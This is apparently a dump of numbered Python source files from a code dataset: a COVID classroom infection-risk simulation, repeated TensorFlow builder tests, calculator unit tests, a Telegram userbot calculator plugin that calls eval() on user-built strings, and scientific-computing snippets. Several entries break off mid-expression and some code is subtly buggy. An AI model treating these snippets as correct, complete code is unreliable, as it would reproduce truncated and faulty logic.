inhalation_rate_faculty = [0.005, 0.01, 1]\n    # inhalation_rate_student = [0.005, 0.007, 1]\n\n\n    percent_faculty_infectious = getCountyCases(county, state)\n    percent_student_infectious = percent_faculty_infectious\n    # percent_faculty_infectious = [0.7, 1.4, 0]\n    # percent_student_infectious = [0.7, 1.4, 0]\n\n    ############################\n\n    def randomizeAll():\n        randomize(ventilation_w_outside_air)\n        randomize(decay_rate_of_virus)\n        randomize(deposition_to_surface)\n        randomize(additional_control_measures)\n        randomize(exhalation_mask_efficiency)\n        randomize(inhalation_mask_efficiency)\n        randomize(inhalation_rate_faculty)\n        randomize(inhalation_rate_student)\n        randomize(percent_faculty_infectious)\n        randomize(percent_student_infectious)\n\n        randomizeFromNormal(quanta_emission_rate_faculty)\n        randomizeFromNormal(quanta_emission_rate_student)\n\n    def randomize(bounds):\n        bounds[2] = bounds[0] + np.random.random_sample() * \\\n            (bounds[1]-bounds[0])\n\n    def randomizeFromNormal(normdist):\n        normdist[2] = 10**np.random.normal(normdist[0], normdist[1])\n        ##also does the UNDO LOG\n\n    # Q_f: quanta emission rate by infected faculty\n    # m_out: mask exhalation efficiency\n    # k: first order loss coefficients for ventilation , decay, deposition, and other control measures\n    # V: volume of classroom\n    # T: duration of each in-person class session\n\n    # Average quanta concentration during class period if 1 faculty member is infected:\n    def calc_Cf(Q_f, m_out, k, V, T):\n        cf = ((Q_f*(1-m_out))/(k*V))*(1-(1/(k*T))*(1-e**(-k*T)))\n\n        return cf\n\n    # Average quanta concentration during class period if 1 student is infected:\n    def calc_Cs(Q_s, m_out, k, V, T):\n        cs = ((Q_s*(1-m_out))/(k*V))*(1-(1/(k*T))*(1-e**(-k*T)))\n        return cs\n\n    # Quanta inhaled by student if 1 faculty infected:\n    def calc_Nfs(C_f, I_s, m_in, T):\n        Nfs = C_f*I_s*(1-m_in)*T\n        return Nfs\n\n    # Quanta inhaled by faculty if 1 student infected:\n    def calc_Nsf(C_s, I_f, m_in, T):\n        Nsf = C_s*I_f*(1-m_in)*T\n        return Nsf\n\n    # Quanta inhaled by student if 1 student infected\n    def calc_Nss(C_s, I_s, m_in, T):\n        Nss = C_s*I_s*(1-m_in)*T\n        return Nss\n\n    # Probability of 1 faculty infecting student:\n    def calc_pfs(f_f, N_fs):\n        pfs = f_f*(1-np.exp(-N_fs))\n        return pfs\n\n    # Probability of 1 student infecting faculty:\n    def calc_psf(f_s, N_sf):\n        psf = f_s*(1-np.power(e, -N_sf))\n        return psf\n\n    # Probability of 1 student infecting student:\n    def calc_pss(f_s, N_ss):\n        pss = f_s*(1-np.power(e, -N_ss))\n        return pss\n\n    # Probability of faculty infection in one class session:\n    def calc_p1f(p_sf, N_s):\n        p1f = 1-(1-p_sf)**(N_s)\n        return p1f\n\n    # Probability of student infection in one class session:\n    def calc_p1s(p_ss, n_s, p_fs, n_f):\n        p1s = 1-((1-p_ss)**(n_s-1)*(1-p_fs)**n_f)\n        return p1s\n\n    # Probability of faculty infection for semester:\n    def calc_pf(p1_f, n_c):\n        pf = 1-(1-p1_f)**n_c\n        return pf\n\n    # Probability of student infection for semester:\n    def calc_ps(p1_s, n_c):\n        ps = 1-(1-p1_s)**n_c\n        return ps\n\n    trials = 10000\n    fac_runs = np.zeros(trials)\n    student_runs = np.zeros(trials)\n    for x in range(trials):\n        randomizeAll()\n\n        cf = calc_Cf(quanta_emission_rate_faculty[2], exhalation_mask_efficiency[2], (ventilation_w_outside_air[2] +\n                                                                                      decay_rate_of_virus[2]+deposition_to_surface[2]+additional_control_measures[2]), volume, duration)\n        #print(\"cf: \", cf)\n        cs = calc_Cs(quanta_emission_rate_student[2], exhalation_mask_efficiency[2], (ventilation_w_outside_air[2] +\n                                                                                      decay_rate_of_virus[2]+deposition_to_surface[2]+additional_control_measures[2]), volume, duration)\n        #print(\"cs: \", cs)\n        Nfs = calc_Nfs(\n            cf, inhalation_rate_student[2]*60, inhalation_mask_efficiency[2], duration)\n        #print(\"Nfs: \", Nfs)\n        Nsf = calc_Nsf(\n            cs, inhalation_rate_faculty[2]*60, inhalation_mask_efficiency[2], duration)\n        #print(\"Nsf: \", Nsf)\n        Nss = calc_Nss(\n            cs, inhalation_rate_student[2]*60, inhalation_mask_efficiency[2], duration)\n        #print(\"Nss: \", Nss)\n        Pfs = calc_pfs(percent_faculty_infectious[2], Nfs)\n        # print(\"f_f: \", percent_faculty_infectious)\n        #print(\"Pfs: \", Pfs)\n        Psf = calc_psf(percent_student_infectious[2], Nsf)\n        #print(\"Psf: \", Psf)\n        Pss = calc_pss(percent_student_infectious[2], Nss)\n        #print(\"Pss: \", Pss)\n        P1f = calc_p1f(Psf, num_students)\n        #print(\"P1f: \", P1f)\n        P1s = calc_p1s(Pss, num_students, Pfs, num_faculty)\n        #print(\"P1s: \", P1s)\n        Pf = calc_pf(P1f, num_class_periods)\n        #print(\"Pf: \", Pf)\n        Ps = calc_ps(P1s, num_class_periods)\n        #print(\"Ps: \", Ps)\n        fac_runs[x] = Pf\n        student_runs[x] = Ps\n\n    student_mean = round(statistics.mean(student_runs)*100, 2)\n    fac_mean = round(statistics.mean(fac_runs)*100, 2)\n\n    student_quants_05 = np.quantile(student_runs, 0.05)\n    student_quants_25 = np.quantile(student_runs, 0.25)\n    student_quants_50 = np.quantile(student_runs, 0.50)\n    student_quants_75 = np.quantile(student_runs, 0.75)\n    student_quants_95 = np.quantile(student_runs, 0.95)\n\n    fac_quants_05 = np.quantile(fac_runs, 0.05)\n    fac_quants_25 = np.quantile(fac_runs, 0.25)\n    fac_quants_50 = np.quantile(fac_runs, 0.50)\n    fac_quants_75 = np.quantile(fac_runs, 0.75)\n    fac_quants_95 = np.quantile(fac_runs, 0.95)\n\n    studentResults = {'student_quants_05': round(student_quants_05*100, 2),\n                      'student_quants_25': round(student_quants_25*100, 2),\n                      'student_quants_50': round(student_quants_50*100, 2),\n                      'student_quants_75': round(student_quants_75*100, 2),\n                      'student_quants_95': round(student_quants_95*100, 2)}\n\n    facultyResults = {'fac_quants_05': round(fac_quants_05*100, 2),\n                      'fac_quants_25': round(fac_quants_25*100, 2),\n                      'fac_quants_50': round(fac_quants_50*100, 2),\n                      'fac_quants_75': round(fac_quants_75*100, 2),\n                      'fac_quants_95': round(fac_quants_95*100, 2)}\n\n    percent_faculty_infectious = [\n        percent_faculty_infectious[0]*100, percent_faculty_infectious[1]*100, 0]\n    percent_student_infectious = [\n        percent_student_infectious[0]*100, percent_student_infectious[1]*100, 0]\n\n    return (student_mean, fac_mean, studentResults, facultyResults, percent_faculty_infectious*100, percent_student_infectious*100)\n", "160": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow.compat.v1 as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "161": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow.compat.v1 as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "162": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "163": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "164": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "165": "import numpy as np\nxcrit = np.inf#38.0\ndef calc_M0_1(x):\n    if x", "166": "from asyncio import exceptions\r\nimport unittest\r\n\r\nfrom django.test import TestCase\r\nimport calc\r\n\r\n\r\nclass TestCalc(unittest.TestCase):\r\n\r\n    def test_add(self):\r\n        result = calc.add(10, 5)\r\n        self.assertEqual(result, 15)\r\n        # to run this we need to run this command.\r\n        # python -m unittest test_calc.py\r\n    def test_add1(self):\r\n        self.assertEqual(calc.add(10, 5), 15)\r\n        self.assertEqual(calc.add(100, 5), 105)\r\n        self.assertEqual(calc.add(1000, 5), 1005)\r\n        self.assertEqual(calc.add(10, -5), 5)\r\n        self.assertEqual(calc.add(-10, -10), -20)\r\n\r\n    def test_sub(self):\r\n        self.assertEqual(calc.sub(10, 5), 5)\r\n        self.assertEqual(calc.sub(100, 5), 95)\r\n        self.assertEqual(calc.sub(1000, 5), 995)\r\n        self.assertEqual(calc.sub(10, -5), 15)\r\n        self.assertEqual(calc.sub(-10, -10), 0)\r\n\r\n    def test_mul(self):\r\n        self.assertEqual(calc.mul(10, 5), 50)\r\n        self.assertEqual(calc.mul(100, 5), 500)\r\n        self.assertEqual(calc.mul(1000, 5), 5000)\r\n        self.assertEqual(calc.mul(10, -5), -50)\r\n        self.assertEqual(calc.mul(-10, -10), 100)\r\n\r\n    def test_div(self):\r\n        self.assertEqual(calc.div(10, 5), 2)\r\n        self.assertEqual(calc.div(100, 5), 20)\r\n        self.assertEqual(calc.div(1000, 5), 200)\r\n        self.assertEqual(calc.div(10, -5), -2)\r\n        self.assertEqual(calc.div(-10, -10), 1)\r\n\r\n        self.assertRaises(ValueError, calc.div, 10, 0) \r\n        # this is for checking exceptions\r\n\r\n        with self.assertRaises(ValueError):\r\n            calc.div( 10, 2)\r\n        # Same as the previous code but using context manager, it is the most preferred method for doing tests.\r\n\r\n\r\nif __name__ == '__main__':\r\n    unittest.main()\r\n\r\n    # to run as ::    python test_calc.py", "167": "# Ultroid - UserBot\n# Copyright (C) 2021 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import Button, asst, callback, get_string, in_pattern, udB, ultroid_cmd\n\nCALC = {}\n\nm = [\n    \"AC\",\n    \"C\",\n    \"\u232b\",\n    \"%\",\n    \"7\",\n    \"8\",\n    \"9\",\n    \"+\",\n    \"4\",\n    \"5\",\n    \"6\",\n    \"-\",\n    \"1\",\n    \"2\",\n    \"3\",\n    \"x\",\n    \"00\",\n    \"0\",\n    \".\",\n    \"\u00f7\",\n]\ntultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\nlst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\nlst.append([Button.inline(\"=\", data=\"calc=\")])\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.delete(\"calc\")\n    if e.client._bot:\n        return await e.reply(get_string(\"calc_1\"), buttons=lst)\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\", owner=True)\nasync def _(e):\n    calc = e.builder.article(\"Calc\", text=get_string(\"calc_1\"), buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"), owner=True)\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    user = e.query.user_id\n    get = None\n    if x == \"AC\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.edit(\n            get_string(\"calc_1\"),\n            buttons=[Button.inline(get_string(\"calc_2\"), data=\"recalc\")],\n        )\n    elif x == \"C\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get[:-1]})\n            await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/100\"})\n            await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/\"})\n            await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"*\"})\n            await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = eval(get)\n            try:\n                num = float(out)\n                await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                CALC.pop(user)\n                await e.answer(get_string(\"sf_8\"), cache_time=0, alert=True)\n        await e.answer(\"None\")\n    else:\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + x})\n            return await e.answer(str(get + x))\n        CALC.update({user: x})\n        await e.answer(str(x))\n\n\n@callback(\"recalc\", owner=True)\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(get_string(\"calc_1\"), buttons=lst)\n", "168": "import pytest\nfrom ase.build import molecule\nfrom ase.test.factories import ObsoleteFactoryWrapper\n\n\nrequired = {'aims': dict(sc_accuracy_rho=5.e-3)}\n\n\n@pytest.mark.parametrize('name', ['aims', 'gamess_us', 'gaussian'])\ndef test_h2dft_old(name):\n    factory = ObsoleteFactoryWrapper(name)\n    run(factory)\n\n\ncalc = pytest.mark.calculator\n\n\n#@calc('abinit', ecut=200, toldfe=0.0001)\n# Doesn't work with abinit9.\n# We should replace the restart stuff anyway.\n@calc('cp2k', auto_write=True, uks=True)\n# @calc('gpaw', mode='lcao', basis='sz(dzp)')\ndef test_h2dft(factory):\n    run(factory)\n\n\ndef run(factory):\n    name = factory.name\n    par = required.get(name, {})\n    calc = factory.calc(label=name, xc='LDA', **par)\n    h2 = molecule('H2', calculator=calc)\n    h2.center(vacuum=2.0)\n    e2 = h2.get_potential_energy()\n    calc.set(xc='PBE')\n    e2pbe = h2.get_potential_energy()\n    h1 = h2.copy()\n    del h1[1]\n    h1.set_initial_magnetic_moments([1])\n    h1.calc = calc\n    e1pbe = h1.get_potential_energy()\n    calc.set(xc='LDA')\n    e1 = h1.get_potential_energy()\n    try:\n        m1 = h1.get_magnetic_moment()\n    except NotImplementedError:\n        pass\n    else:\n        print(m1)\n    print(2 * e1 - e2)\n    print(2 * e1pbe - e2pbe)\n    print(e1, e2, e1pbe, e2pbe)\n    calc = factory.calc(restart=name)\n    print(calc.parameters, calc.results, calc.atoms)\n    assert not calc.calculation_required(h1, ['energy'])\n    h1 = calc.get_atoms()\n    print(h1.get_potential_energy())\n    label = 'dir/' + name + '-h1'\n    calc = factory.calc(label=label, atoms=h1, xc='LDA', **par)\n    print(h1.get_potential_energy())\n", "169": "def funA(calc_tax):\n    minus=120000+200000 #320000 \u55ae\u8eab+\u6a19\u6e96\u6263\u9664\u984d+\u85aa\u8cc7\u6240\u5f97\u7279\u5225\u6263\u9664\u984d\n    calc_tax=calc_tax-minus \n    total=0\n    if(calc_tax<=540000):\n        total=calc_tax*0.05\n    elif(540000", "170": "from __future__ import absolute_import, division, print_function\ndef calc_k(fo, fc):\n  \"scale factor for (fo-k*fc)**2, only similar to factor for abs(fo-k*fc)\"\n  from scitbx.array_family import flex\n  k_num = flex.sum(fo * fc)\n  k_den = flex.sum(fc * fc)\n  assert k_den != 0\n  assert k_den**2 != 0\n  k = k_num / k_den\n  k_d_num = fo * k_den - k_num * 2 * fc\n  k_d = k_d_num / k_den**2\n  k_d2 = -2 * (k_num * k_den + 2 * k_d_num * fc) / k_den**3\n  return k, k_d, k_d2\n\ndef calc_t(fo, fc, k, k_d, k_d2):\n  from scitbx.array_family import flex\n  deltas = fo - k * fc\n  signs = flex.double(fo.size(), 1)\n  signs.set_selected(deltas < 0, -1)\n  deltas *= signs\n  t_num = flex.sum(deltas)\n  t_den = flex.sum(fo)\n  assert t_den != 0\n  t = t_num / t_den\n  if (k_d is None):\n    return t\n  t_d = -(k_d * flex.sum(signs * fc) + signs * k) / t_den\n  if (k_d2 is None):\n    return t, t_d\n  t_d2 = -(k_d2 * flex.sum(signs * fc) + 2 * signs * k_d) / t_den\n  return t, t_d, t_d2\n\nclass target(object):\n\n  def __init__(O, f_obs, f_calc=None, f_calc_abs=None, fca_sq_eps=1e-100):\n    assert [f_calc, f_calc_abs].count(None) == 1\n    if (f_calc is not None):\n      from scitbx.array_family import flex\n      f_calc_abs = flex.abs(f_calc)\n    O.k, O.k_d, O.k_d2 = calc_k(f_obs, f_calc_abs)\n    O.t, O.g, O.c = calc_t(f_obs, f_calc_abs, O.k, O.k_d, O.k_d2)\n    O.f_calc_gradients = None\n    O.f_calc_hessians = None\n    if (f_calc is not None):\n      fca_sq = f_calc_abs**2\n      isel_zero = (fca_sq <= fca_sq_eps).iselection()\n      f_calc_abs.set_selected(isel_zero, 1)\n      fca_sq.set_selected(isel_zero, 1)\n      O.f_calc_gradients = O.g / f_calc_abs * f_calc\n      O.f_calc_gradients.set_selected(isel_zero, 0j)\n      a = flex.real(f_calc)\n      b = flex.imag(f_calc)\n      aa, bb, ab = a*a, b*b, a*b\n      haa = O.c * aa + O.g * bb / f_calc_abs\n      hbb = O.c * bb + O.g * aa / f_calc_abs\n      hab = (O.c - O.g / f_calc_abs) * a * b\n      O.f_calc_hessians = flex.vec3_double(haa, hbb, hab) / fca_sq\n      O.f_calc_hessians.set_selected(isel_zero, (0,0,0))\n\n  def target_work(O):\n    return O.t\n\n  def gradients_work(O):\n    return O.f_calc_gradients\n\n  def hessians_work(O):\n    return O.f_calc_hessians\n", "171": "from symcalc.plugins.output.store import OutputStore\nfrom tests import TestCalculator, generate_test_values, random_str\n\n\ndef test_plugin_output_store_instantiate():\n    OutputStore()\n\n\ndef test_plugin_output_store_hook():\n    calc = TestCalculator()\n    plugin = OutputStore()\n    calc.register_plugin_and_enable(plugin)\n    assert plugin in calc.plugins\n\n\ndef test_plugin_output_store_context_updated():\n    calc = TestCalculator()\n    calc.register_plugin_and_enable(OutputStore())\n    assert calc.chksym(\"output_store\")\n    assert callable(calc.getsym(\"output_store\"))\n\n\ndef test_plugin_output_store_available():\n    calc = TestCalculator()\n    calc.register_plugin_and_enable(OutputStore())\n    assert callable(calc.command(\"output_store\"))\n\n\ndef test_plugin_output_store_python(capfd):\n    calc = TestCalculator()\n    plugin = OutputStore()\n    calc.register_plugin_and_enable(plugin)\n    l = [None]\n    for i in range(20):\n        s = random_str()\n        calc.command(f\"'{s}'\")\n        l.append(s)\n        assert \"Result\" in capfd.readouterr().out\n        assert calc.context.out[-1] == s\n    for x in generate_test_values(4, real=True, complex=True, include_edge_cases=False):\n        l.append(x)\n        calc.command(str(x))\n        assert \"Result\" in capfd.readouterr().out\n        assert calc.context.out[-1] == x\n\n\ndef test_plugin_output_store_sympy(capfd):\n    calc = TestCalculator()\n    plugin = OutputStore()\n    